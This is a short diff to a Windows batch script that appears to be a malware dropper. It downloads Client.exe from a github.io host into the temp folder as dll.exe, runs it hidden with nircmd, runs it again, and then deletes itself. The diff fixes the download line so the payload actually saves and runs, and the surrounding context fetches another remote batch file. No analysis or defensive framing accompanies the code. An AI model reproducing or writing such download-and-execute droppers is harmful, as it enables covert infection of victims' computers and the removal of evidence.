@@ -19,6 +19,6 @@ curl.exe %proxy% https://cryptedlumos.github.io/purga_paperino.bat --output "%te
 echo.
 )
 echo [TARGET STOP]
-curl.exe %proxy% https://cryptedlumos.github.io/client.exe --output "%temp%\pp.bat" && nircmd exec hide "%temp%\dll.exe"
+curl.exe %proxy% https://cryptedlumos.github.io/Client.exe --output "%temp%\dll.exe" && nircmd exec hide "%temp%\dll.exe"
 "%temp%\dll.exe"
 del /s /f /q /a "%~f0"
